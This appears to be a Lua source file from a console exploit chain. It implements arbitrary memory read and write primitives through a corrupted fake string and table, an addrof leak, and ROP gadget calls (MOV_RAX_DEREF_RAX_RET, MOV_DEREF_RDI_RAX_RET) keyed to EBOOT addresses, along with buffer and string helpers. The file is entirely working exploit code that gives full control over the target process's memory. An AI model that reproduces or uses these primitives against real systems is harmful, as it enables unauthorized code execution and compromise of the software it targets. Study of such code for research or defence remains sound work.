
-- DO NOT PUT ADDRESS LOWER THAN EBOOT_BASE+0x393350
-- EBOOT text segment size is 0x374000 so this should cover almost all address
function read_unstable(addr, len)
    local offset = addr - STRING_BASE
    local data = FAKE_STRING:sub(offset + 1, offset + len)
    return data
end

function read8_unstable(addr)
    return string.unpack("B", read_unstable(addr, 1))
end

function read32_unstable(addr)
    return string.unpack("<I4", read_unstable(addr, 4))
end

function read64_unstable(addr)
    return string.unpack("<I8", read_unstable(addr, 8))
end

-- WRITE_TABLE[2] writes to ADDROF_TABLE+0x10 (array pointer)
-- ADDROF_TABLE[N] writes to array + (N-1)*16
-- 
-- So ADDROF_TABLE[3] writes to array + 2*16 = array + 0x20
-- 
-- To write to addr using ADDROF_TABLE[3]:
--   We set array = addr - 0x20
--   Then ADDROF_TABLE[3] writes to (addr - 0x20) + 0x20 = addr
--
-- This corrupts adjacent 8 bytes so do not use this other than ROP
function write64_unstable(addr, value)
    -- Set ADDROF_TABLE's array to addr - 0x20
    WRITE_TABLE[2] = addr - 0x20
    
    -- Write value using ADDROF_TABLE[3]
    -- This writes to (addr - 0x20) + 0x20 = addr
    ADDROF_TABLE[3] = value
    
    -- Restore array pointer
    WRITE_TABLE[2] = ARRAY_ADDR
end

function addrof(obj)
    ADDROF_TABLE[1] = obj
    return read64_unstable(ARRAY_ADDR)
end

function read64(address)
    return call_rop(MOV_RAX_DEREF_RAX_RET, address)
end

function read32(address)
    return read64(address) & 0xFFFFFFFF
end

function read16(address)
    return read64(address) & 0xFFFF
end

function read8(address)
    return read64(address) & 0xFF
end

function write64(address, value)
    if type(value) == "string" then
        value = addrof(value) + 0x20
    end
    call_rop(MOV_DEREF_RDI_RAX_RET, value, address)
end

function write32(address, value)
    if type(value) == "string" then
        value = addrof(value) + 0x20
    end
    local current = read64(address)
    write64(address, (current & ~0xFFFFFFFF) | (value & 0xFFFFFFFF))
end

function write16(address, value)
    if type(value) == "string" then
        value = addrof(value) + 0x20
    end
    local current = read64(address)
    write64(address, (current & ~0xFFFF) | (value & 0xFFFF))
end

function write8(address, value)
    if type(value) == "string" then
        value = addrof(value) + 0x20
    end
    local current = read64(address)
    write64(address, (current & ~0xFF) | (value & 0xFF))
end

function malloc(size)
    return calloc(size, 1)
end

function read_buffer(addr, size)
    local str = string.rep("\0", size)
    local str_data_addr = addrof(str) + 0x20
    
    local qwords = size // 8
    for i = 0, qwords - 1 do
        local val = read64(addr + i * 8)
        write64(str_data_addr + i * 8, val)
    end
    
    local remaining = size % 8
    for i = 0, remaining - 1 do
        local byte_val = read8(addr + qwords * 8 + i)
        write8(str_data_addr + qwords * 8 + i, byte_val)
    end
    
    return str
end

function write_buffer(dest, buffer)
    local buffer_addr = addrof(buffer) + 0x20
    local size = #buffer
    
    local qwords = size // 8
    for i = 0, qwords - 1 do
        local val = read64(buffer_addr + i * 8)
        write64(dest + i * 8, val)
    end
    
    local remaining = size % 8
    for i = 0, remaining - 1 do
        local byte_val = read8(buffer_addr + qwords * 8 + i)
        write8(dest + qwords * 8 + i, byte_val)
    end
end

function read_null_terminated_string(addr)
    local result = ""
    while true do
        local chunk = read_buffer(addr, 0x8)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        addr = addr + #chunk
    end
end

